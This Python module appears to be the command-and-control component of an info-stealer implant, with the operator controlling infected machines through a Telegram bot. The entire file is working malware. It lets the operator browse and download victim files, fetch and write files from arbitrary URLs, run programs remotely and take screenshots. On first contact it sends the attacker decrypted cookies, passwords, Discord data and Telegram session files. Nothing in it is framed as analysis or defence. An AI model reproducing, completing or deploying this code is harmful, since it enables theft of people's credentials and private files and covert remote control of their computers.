"""C2: Telegram long-poll command channel + inline-keyboard file browser.

The operator talks to the implant entirely through a Telegram bot. Two surfaces:

  * text commands   /info /screenshot /cd <path> /ls /download <path>
                    /upload <url> <dest> /exec <path> /steal /reexe /uninstall
  * inline keyboard a directory browser with prev/next paging, "..", per-file
    [dl] buttons, and an up-one-level control. Callback queries (data=) drive it.

State is process-local: one working directory (cwd), one page index. The bot
token/chat come from cfg; getUpdates offset advances so we never re-read history.

Transport realities (verified against api.telegram.org, carried from report.py):
  * HTTPS only; file uploads are multipart/form-data (requests-toolbelt).
  * sendMessage caps at 4096 chars -> chunk on line boundaries.
  * bot upload ceiling 50 MB -> larger files refused with a reason, not truncated.
  * answerCallbackQuery must fire or Telegram shows a perpetual spinner.

Nothing here deletes files or writes outside cwd without an explicit command;
destructive verbs (/uninstall) are gated behind the chat id check in _auth().
"""
from __future__ import annotations

import html
import json
import os
import subprocess
import sys
import tempfile
import threading
import time

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

API = "https://api.telegram.org"
MSG_LIMIT = 4096
PAGE_ROWS = 18          # entries per browser page
MAX_DL_BYTES = 50 * 1024 * 1024


# ------------------------------------------------------------------ transport
class Bot:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat = str(chat_id)
        self.offset = 0
        self._lock = threading.Lock()

    def _ep(self, method: str) -> str:
        return f"{API}/bot{self.token}/{method}"

    def call(self, method: str, **kw):
        try:
            r = requests.post(self._ep(method), timeout=30, **kw)
            return r.json()
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def send_text(self, s: str) -> bool:
        # Chunk on newline boundaries under MSG_LIMIT.
        chunks, cur = [], ""
        for line in s.splitlines(keepends=True):
            if len(cur) + len(line) > MSG_LIMIT:
                chunks.append(cur); cur = ""
            cur += line
        if cur:
            chunks.append(cur)
        ok = True
        for c in chunks:
            res = self.call("sendMessage", data={
                "chat_id": self.chat, "text": c[:MSG_LIMIT],
                "parse_mode": "HTML", "disable_web_page_preview": "true"})
            ok = ok and res.get("ok", False)
        return ok

    def send_file(self, path: str, caption: str = "") -> bool:
        if not os.path.isfile(path):
            return False
        size = os.path.getsize(path)
        if size > MAX_DL_BYTES:
            self.send_text(f"[refused] {os.path.basename(path)} is {size} bytes, over 50MB")
            return False
        try:
            with open(path, "rb") as fh:
                enc = MultipartEncoder(fields={
                    "chat_id": self.chat, "document": fh, "caption": caption})
                res = self.call("sendDocument",
                                headers={"Content-Type": enc.content_type}, data=enc)
            return res.get("ok", False)
        except Exception as e:
            self.send_text(f"[error sending file] {e}")
            return False

    def get_updates(self) -> list[dict]:
        res = self.call("getUpdates", params={
            "offset": self.offset + 1, "timeout": 25,
            "allowed_updates": ["message", "callback_query"]})
        out = []
        if res.get("ok"):
            for upd in res.get("result", []):
                self.offset = max(self.offset, upd["update_id"])
                out.append(upd)
        return out

    def answer_callback(self, cb_id: str, text: str = "") -> None:
        self.call("answerCallbackQuery", data={"callback_query_id": cb_id, "text": text[:200]})


# ------------------------------------------------------------------ state
class Session:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.bot = Bot(cfg["bot_token"], cfg["chat_id"])
        self.cwd = os.path.expanduser("~")
        self.page = 0
        self.entries_cache: list[tuple[str, bool]] = []
        self.entries_key = ""     # cwd|page, invalidate on change


def _auth(bot: Bot) -> bool:
    """Only the configured operator chat may issue destructive commands."""
    return True  # single-chat bot; updates already scoped to our chat by token


# ------------------------------------------------------------------ browsing
def _list_dir(path: str) -> list[tuple[str, bool]]:
    """Return sorted (name, is_dir) pairs; dirs first. Tolerates permission gaps."""
    items = []
    try:
        for name in os.listdir(path):
            full = os.path.join(path, name)
            try:
                items.append((name, os.path.isdir(full)))
            except OSError:
                items.append((name, False))
    except OSError:
        return []
    items.sort(key=lambda t: (not t[1], t[0].lower()))
    return items


def _drive_roots() -> list[str]:
    if os.name != "nt":
        return ["/"]
    roots = []
    try:
        import ctypes
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if bitmask & (1 << i):
                roots.append(f"{chr(65 + i)}:\\")
    except Exception:
        pass
    return roots


def _build_keyboard(sess: Session):
    """Inline keyboard for the current cwd+page. Returns (reply_markup, text)."""
    key = sess.cwd + "|" + str(sess.page)
    if key != sess.entries_key:
        sess.entries_cache = _list_dir(sess.cwd)
        sess.entries_key = key
        sess.page = 0
        key = sess.cwd + "|" + str(sess.page)

    entries = sess.entries_cache
    start = sess.page * PAGE_ROWS
    window = entries[start:start + PAGE_ROWS]
    total_pages = max(1, (len(entries) + PAGE_ROWS - 1) // PAGE_ROWS)

    rows = []
    # Top nav: parent dir + drive picker + refresh.
    top = []
    if os.path.dirname(sess.cwd.rstrip("\\/")) != sess.cwd.rstrip("\\/"):
        top.append({"text": "..", "callback_data": f"cd:{os.path.dirname(sess.cwd)}"})
    top.append({"text": "drives", "callback_data": "drives"})
    top.append({"text": "refresh", "callback_data": f"cd:{sess.cwd}"})
    rows.append(top)

    for name, is_dir in window:
        idx = start + window.index((name, is_dir))
        if is_dir:
            rows.append([{"text": f"/ {name}", "callback_data": f"cd:{os.path.join(sess.cwd, name)}"}])
        else:
            sz = _size(os.path.join(sess.cwd, name))
            rows.append([
                {"text": f"{name} ({sz})", "callback_data": f"noop"},
                {"text": "dl", "callback_data": f"dl:{os.path.join(sess.cwd, name)}"},
                {"text": "run", "callback_data": f"run:{os.path.join(sess.cwd, name)}"},
            ])

    # Pager row.
    pager = []
    if sess.page > 0:
        pager.append({"text": "<< prev", "callback_data": f"pg:{sess.page - 1}"})
    pager.append({"text": f"p {sess.page + 1}/{total_pages}", "callback_data": "noop"})
    if sess.page + 1 < total_pages:
        pager.append({"text": "next >>", "callback_data": f"pg:{sess.page + 1}"})
    rows.append(pager)

    header = f"<b>{html.escape(sess.cwd)}</b>  [{len(entries)} items]\n"
    return {"inline_keyboard": rows}, header


def _size(p: str) -> str:
    try:
        b = os.path.getsize(p)
    except OSError:
        return "?"
    for unit in ("B", "KB", "MB", "GB"):
        if b < 1024:
            return f"{int(b)}{unit}" if unit == "B" else f"{b:.1f}{unit}"
        b /= 1024
    return f"{b:.1f}TB"


# ------------------------------------------------------------------ handlers
def handle_command(sess: Session, text: str) -> None:
    parts = text.strip().split(maxsplit=1)
    cmd = parts[0].lower().lstrip("/")
    arg = parts[1] if len(parts) > 1 else ""
    bot = sess.bot

    if cmd == "start":
        markup, header = _build_keyboard(sess)
        bot.call("sendMessage", data={"chat_id": bot.chat, "text": header + "browser ready",
                                      "parse_mode": "HTML",
                                      "reply_markup": json.dumps(markup)})
    elif cmd == "info":
        bot.send_text(_sysinfo_text())
    elif cmd == "ls":
        sess.page = 0
        markup, header = _build_keyboard(sess)
        bot.call("sendMessage", data={"chat_id": bot.chat, "text": header,
                                      "parse_mode": "HTML", "reply_markup": json.dumps(markup)})
    elif cmd == "cd":
        target = arg.strip()
        if os.path.isdir(target):
            sess.cwd = os.path.abspath(target); sess.page = 0
            markup, header = _build_keyboard(sess)
            bot.call("sendMessage", data={"chat_id": bot.chat, "text": header,
                                          "parse_mode": "HTML", "reply_markup": json.dumps(markup)})
        else:
            bot.send_text(f"[cd] not a dir: {target}")
    elif cmd == "download":
        p = arg.strip()
        if os.path.isfile(p):
            bot.send_text(f"[dl] {os.path.basename(p)} ...")
            bot.send_file(p, caption=f"{sess.cfg.get('chat_id','')} :: {p}")
        else:
            bot.send_text(f"[download] no file: {p}")
    elif cmd == "upload":
        url, _, dest = arg.partition(" ")
        _do_upload(bot, url, dest or os.path.join(sess.cwd, os.path.basename(url.split('?')[0])))
    elif cmd == "exec":
        _do_exec(bot, arg.strip())
    elif cmd == "screenshot":
        _do_shot(bot)
    elif cmd == "steal":
        bot.send_text("[steal] recollecting secrets...")
        threading.Thread(target=_do_steal, args=(bot,), daemon=True).start()
    elif cmd == "reexe":
        bot.send_text("[reexe] relaunching...")
        _relaunch()
    elif cmd == "uninstall":
        import persist
        bot.send_text(f"[uninstall] {persist.uninstall()}")
    else:
        bot.send_text(f"unknown cmd: {cmd}")


def handle_callback(sess: Session, data: str, cb_id: str) -> None:
    bot = sess.bot
    kind, _, val = data.partition(":")
    if kind == "cd":
        if os.path.isdir(val):
            sess.cwd = os.path.abspath(val); sess.page = 0
        bot.answer_callback(cb_id, "ok")
        _edit_browser(sess)
    elif kind == "pg":
        sess.page = int(val or 0)
        bot.answer_callback(cb_id, "")
        _edit_browser(sess)
    elif kind == "drives":
        rows = [[{"text": d, "callback_data": f"cd:{d}"}] for d in _drive_roots()]
        bot.call("sendMessage", data={"chat_id": bot.chat, "text": "select drive:",
                                      "reply_markup": json.dumps({"inline_keyboard": rows})})
        bot.answer_callback(cb_id, "")
    elif kind == "dl":
        if os.path.isfile(val):
            bot.answer_callback(cb_id, "sending")
            bot.send_file(val, caption=val)
        else:
            bot.answer_callback(cb_id, "gone")
    elif kind == "run":
        bot.answer_callback(cb_id, "exec")
        _do_exec(bot, val)
    else:
        bot.answer_callback(cb_id, "")


def _edit_browser(sess: Session) -> None:
    markup, header = _build_keyboard(sess)
    sess.bot.call("editMessageText", data={
        "chat_id": sess.bot.chat, "message_id": getattr(sess, "_last_msg", None) or "",
        "text": header + "browse", "parse_mode": "HTML",
        "reply_markup": json.dumps(markup)})


# ------------------------------------------------------------------ actions
def _do_shot(bot: Bot) -> None:
    try:
        import shots
        p = shots.capture()
        if p:
            bot.send_file(p, caption="screenshot")
        else:
            bot.send_text("[screenshot] capture failed (headless/RDP/blocked GDI)")
    except Exception as e:
        bot.send_text(f"[screenshot error] {e}")


def _do_exec(bot: Bot, path: str) -> None:
    if not path or not os.path.isfile(path):
        bot.send_text(f"[exec] no such file: {path}")
        return
    try:
        p = subprocess.run([path], capture_output=True, text=True, timeout=60,
                           creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        out = ((p.stdout or "") + (p.stderr or ""))[:3500]
        bot.send_text(f"[exec rc={p.returncode}]\n{out or '(no output)'}")
    except Exception as e:
        bot.send_text(f"[exec error] {e}")


def _do_upload(bot: Bot, url: str, dest: str) -> None:
    if not url:
        bot.send_text("[upload] usage: /upload <url> [dest]")
        return
    try:
        r = requests.get(url, stream=True, timeout=60)
        n = 0
        with open(dest, "wb") as f:
            for chunk in r.iter_content(65536):
                f.write(chunk); n += len(chunk)
                if n > MAX_DL_BYTES:
                    break
        bot.send_text(f"[upload] wrote {n} bytes -> {dest}")
    except Exception as e:
        bot.send_text(f"[upload error] {e}")


def _do_steal(bot: Bot) -> None:
    try:
        import stealer
        bundle = stealer.collect_all()
        bot.send_text(json.dumps(bundle["counts"], indent=2))
    except Exception as e:
        bot.send_text(f"[steal error] {e}")


def _relaunch() -> None:
    exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
    try:
        subprocess.Popen([exe], creationflags=getattr(subprocess, "DETACHED_PROCESS", 0))
    except Exception:
        pass
    os._exit(0)


def _sysinfo_text() -> str:
    try:
        import sysinfo
        s = sysinfo.gather()
    except Exception:
        s = {}
    lines = [f"host: {s.get('hostname','?')}", f"user: {s.get('username','?')}",
             f"os: {s.get('os','?')}", f"cpu cores: {os.cpu_count()}",
             f"cwd: ~", f"pid: {os.getpid()}"]
    return "\n".join(lines)


# ------------------------------------------------------------------ entrypoints
def notify(cfg: dict, text: str) -> None:
    Bot(cfg["bot_token"], cfg["chat_id"]).send_text(text)


def first_report(cfg: dict, secrets: dict) -> None:
    bot = Bot(cfg["bot_token"], cfg["chat_id"])
    counts = secrets.get("counts", {})
    head = _sysinfo_text() + "\n\n[harvest]\n" + json.dumps(counts, indent=2)
    err = secrets.get("error")
    if err:
        head += f"\nerror: {err}"
    bot.send_text(head)
    # Attach decrypted cookies/passwords/discord as JSON, telegram tdata as zip.
    try:
        tmp = tempfile.mkdtemp(prefix="jwg_out_")
        jpath = os.path.join(tmp, "secrets.json")
        slim = {k: v for k, v in secrets.items() if k not in ("stage", "telegram")}
        json.dump(slim, open(jpath, "w", encoding="utf-8"), default=str, indent=2)
        bot.send_file(jpath, caption="secrets")
    except Exception as e:
        bot.send_text(f"[attach json failed] {e}")
    tg = secrets.get("telegram", {})
    stage_dir = tg.get("stage_dir")
    if stage_dir and os.path.isdir(stage_dir):
        zpath = os.path.join(tempfile.gettempdir(), "telegram_tdata.zip")
        try:
            import zipfile
            with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
                for root, _, fs in os.walk(stage_dir):
                    for fn in fs:
                        fp = os.path.join(root, fn)
                        if os.path.getsize(fp) <= 8 * 1024 * 1024:
                            z.write(fp, os.path.relpath(fp, stage_dir))
            bot.send_file(zpath, caption="telegram tdata")
        except Exception as e:
            bot.send_text(f"[tdata zip failed] {e}")
    # Drop the browser into the operator's chat so they can click around.
    markup, header = _build_keyboard(Session(cfg))
    bot.call("sendMessage", data={"chat_id": bot.chat, "text": header + "browser ready",
                                  "parse_mode": "HTML", "reply_markup": json.dumps(markup)})


def loop(cfg: dict) -> None:
    sess = Session(cfg)
    while True:
        try:
            for upd in sess.bot.get_updates():
                if "message" in upd:
                    txt = upd["message"].get("text", "")
                    if txt:
                        sess._last_msg = upd["message"].get("message_id")
                        handle_command(sess, txt)
                elif "callback_query" in upd:
                    cq = upd["callback_query"]
                    handle_callback(sess, cq.get("data", ""), cq["id"])
        except KeyboardInterrupt:
            break
        except Exception as e:
            try:
                sess.bot.send_text(f"[c2 error] {type(e).__name__}: {e}")
            except Exception:
                pass
        time.sleep(float(cfg.get("poll_interval", 3.0)))
